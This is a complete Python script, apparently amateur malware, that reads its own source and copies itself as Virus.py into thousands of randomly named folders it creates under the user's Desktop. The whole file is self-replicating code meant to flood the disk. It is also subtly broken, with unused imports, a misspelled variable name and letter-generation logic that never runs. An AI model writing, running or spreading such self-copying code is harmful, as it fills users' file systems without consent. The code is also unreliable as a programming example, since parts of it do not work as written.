import os
import random
from sys import api_version
from typing import ValuesView   

script =__file__

File = open(script,'r')
Virus_Code = File.read()
File.close()

user = os.getlogin()
location = r'C:\Users\{0}\Desktop\Virus\\'.format(user)

def Replicate(Folder):
    os.chdir(Folder)
    File = open('Virus.py','w+')
    File.write(Virus_Code)
    File.close()
    os.chdir(location)


x=0
for n in range(1000):

    Replication_Amount = 5
    Alpha = 'abcdef'
    Digits = '0123456789'
    Length = [6,8,10,12,14]

    for Replication in range(Replication_Amount):
        Len = random.choice(Length)
        Alpha_Count = 0
        Hexa = ""
        for _ in range(Len):
            if Alpha_Count != 0:
                Alpha_Count += 1
                Hexa += random.choice(Aplha)
            else:
                Hexa += random.choice(Digits)


        try:
            os.mkdir(Hexa)
            Replicate(Hexa)

        except Exception as Error:
                print(Error)